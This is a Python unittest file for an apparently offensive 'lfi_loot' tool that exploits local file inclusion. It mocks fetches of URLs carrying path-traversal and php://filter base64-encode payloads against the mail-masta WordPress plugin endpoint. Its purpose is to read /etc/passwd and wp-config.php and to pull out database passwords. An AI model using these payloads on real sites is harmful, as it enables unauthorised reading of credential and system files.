#!/usr/bin/env python3

from __future__ import annotations

import base64
import os
import sys
import tempfile
import unittest
import unittest.mock
from pathlib import Path

RECON = Path(__file__).resolve().parents[1]
if str(RECON) not in sys.path:
    sys.path.insert(0, str(RECON))

import lfi_loot


class LfiLootTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.case_home = Path(self._tmp.name) / "cases" / "startup"
        self.case_home.mkdir(parents=True)
        self.input_dir = Path(self._tmp.name) / "inputs"
        self.input_dir.mkdir()
        self._old_case_home = os.environ.get("CASE_HOME")
        os.environ["CASE_HOME"] = str(self.case_home)

    def tearDown(self) -> None:
        if self._old_case_home is None:
            os.environ.pop("CASE_HOME", None)
        else:
            os.environ["CASE_HOME"] = self._old_case_home
        self._tmp.cleanup()

    def test_extract_candidates_decodes_embedded_base64(self) -> None:
        encoded = base64.b64encode(b"<?php\necho 'ok';\n").decode("ascii")
        text = f"<html><textarea>{encoded}</textarea></html>"
        candidates = lfi_loot.extract_candidates(text)
        self.assertTrue(any(c.kind == "base64" and "<?php" in c.text for c in candidates))

    def test_run_writes_successful_outputs_and_secrets(self) -> None:
        passwd = self.input_dir / "etc__passwd.html"
        passwd.write_text("<pre>root:x:0:0:root:/root:/bin/bash</pre>\n", encoding="utf-8")
        wp = self.input_dir / "wp-config.html"
        wp.write_text(
            "<?php\n"
            "define('DB_NAME', 'wordpress');\n"
            "define('DB_USER', 'wpuser');\n"
            "define('DB_PASSWORD', 'password123');\n",
            encoding="utf-8",
        )

        code = lfi_loot.main([str(self.input_dir)])
        self.assertEqual(code, 0)

        out = self.case_home / "exploits" / "lfi-loot"
        self.assertTrue((out / "files" / "etc__passwd.txt").is_file())
        self.assertTrue((out / "files" / "wp-config.php").is_file())
        self.assertTrue((out / "raw" / "etc__passwd.html").is_file())
        self.assertTrue((out / "raw" / "wp-config.html").is_file())

        secrets = (out / "secrets.txt").read_text(encoding="utf-8")
        self.assertIn("DB_NAME=wordpress", secrets)
        self.assertIn("DB_PASSWORD=password123", secrets)

        summary = (out / "summary.json").read_text(encoding="utf-8")
        self.assertIn('"successful_files": 2', summary)
        self.assertIn('"secrets_found": 3', summary)

    def test_name_override_sets_logical_name(self) -> None:
        sample = self.input_dir / "sample.html"
        sample.write_text("<pre>root:x:0:0:root:/root:/bin/bash</pre>\n", encoding="utf-8")
        code = lfi_loot.main(["--name", "/etc/passwd=" + str(sample), str(sample)])
        self.assertEqual(code, 0)
        out = self.case_home / "exploits" / "lfi-loot"
        self.assertTrue((out / "files" / "etc__passwd.txt").is_file())

    def test_infer_logical_name_from_url(self) -> None:
        self.assertEqual(
            lfi_loot.infer_logical_name_from_url("http://10.0.0.1/index.php?file=/etc/passwd"),
            "/etc/passwd",
        )
        self.assertEqual(
            lfi_loot.infer_logical_name_from_url(
                "https://x.test/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
            ),
            "/etc/passwd",
        )
        self.assertEqual(
            lfi_loot.infer_logical_name_from_url(
                "http://10.0.0.1/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php"
            ),
            "../../../../../wp-config.php",
        )

    def test_run_parses_base64_wp_config_body(self) -> None:
        import base64

        wp = (
            "<?php\n"
            "define('DB_NAME', 'wordpress');\n"
            "define('DB_USER', 'wpuser');\n"
            "define('DB_PASSWORD', 'password123');\n"
        )
        encoded = base64.b64encode(wp.encode("utf-8")).decode("ascii")
        sample = self.input_dir / "wp-config.b64.html"
        sample.write_text(encoded + "\n", encoding="utf-8")
        code = lfi_loot.main(
            [
                "--name",
                "/wp-config.php=" + str(sample),
                str(sample),
            ]
        )
        self.assertEqual(code, 0)
        out = self.case_home / "exploits" / "lfi-loot"
        self.assertTrue((out / "files" / "wp-config.php").is_file())
        secrets = (out / "secrets.txt").read_text(encoding="utf-8")
        self.assertIn("DB_PASSWORD=password123", secrets)

    def test_expand_fuzz_inputs(self) -> None:
        template = "http://10.0.0.1/count_of_send.php?pl=FUZZ"
        urls = lfi_loot.expand_fuzz_inputs([template])
        self.assertEqual(len(urls), len(lfi_loot.DEFAULT_FUZZ_PAYLOADS))
        self.assertIn("http://10.0.0.1/count_of_send.php?pl=/etc/passwd", urls)
        self.assertIn("http://10.0.0.1/count_of_send.php?pl=wp-config.php", urls)
        extra = lfi_loot.expand_fuzz_inputs(
            [template],
            extra_payloads=["../../../../../wp-config.php"],
        )
        self.assertEqual(len(extra), len(lfi_loot.DEFAULT_FUZZ_PAYLOADS) + 1)

    def test_build_base64_filter_url(self) -> None:
        direct = (
            "http://10.0.0.1/wordpress/wp-content/plugins/mail-masta/inc/campaign/"
            "count_of_send.php?pl=../../../../../wp-config.php"
        )
        b64 = lfi_loot.build_base64_filter_url(direct)
        self.assertIsNotNone(b64)
        self.assertIn("php://filter/convert.base64-encode/resource=", b64 or "")
        self.assertIsNone(lfi_loot.build_base64_filter_url(b64 or ""))

    def test_auto_base64_fallback_on_empty_direct_include(self) -> None:
        direct = "http://10.0.0.1/count_of_send.php?pl=../../../../../wp-config.php"
        b64 = lfi_loot.build_base64_filter_url(direct)
        self.assertIsNotNone(b64)
        wp = "<?php\ndefine('DB_NAME', 'wordpress');\ndefine('DB_PASSWORD', 'secret');\n"
        encoded = base64.b64encode(wp.encode("utf-8"))

        calls: list[str] = []

        class _FakeResp:
            def __init__(self, body: bytes) -> None:
                self._body = body

            def read(self) -> bytes:
                return self._body

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return False

        def _fake_urlopen(req, timeout=30, context=None):
            url = req.full_url
            calls.append(url)
            if url == direct:
                return _FakeResp(b"")
            if url == b64:
                return _FakeResp(encoded)
            raise AssertionError(f"unexpected url: {url}")

        with unittest.mock.patch("lfi_loot.urlopen", _fake_urlopen):
            code = lfi_loot.main(["-u", direct])

        self.assertEqual(code, 0)
        self.assertEqual(calls, [direct, b64])
        out = self.case_home / "exploits" / "lfi-loot"
        self.assertTrue((out / "files" / "UP_UP_UP_UP_UP_UP_UP_UP_UP_UP_wp-config.php").is_file())

    def test_run_fetches_url(self) -> None:
        body = b"<pre>root:x:0:0:root:/root:/bin/bash</pre>\n"

        class _FakeResp:
            def read(self) -> bytes:
                return body

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return False

        def _fake_urlopen(req, timeout=30, context=None):
            self.assertIn("10.0.0.1", req.full_url)
            return _FakeResp()

        with unittest.mock.patch("lfi_loot.urlopen", _fake_urlopen):
            code = lfi_loot.main(["http://10.0.0.1/index.php?file=/etc/passwd"])

        self.assertEqual(code, 0)
        out = self.case_home / "exploits" / "lfi-loot"
        self.assertTrue((out / "files" / "etc__passwd.txt").is_file())
        self.assertTrue(any((out / "raw" / "fetched").glob("*.html")))


if __name__ == "__main__":
    unittest.main()
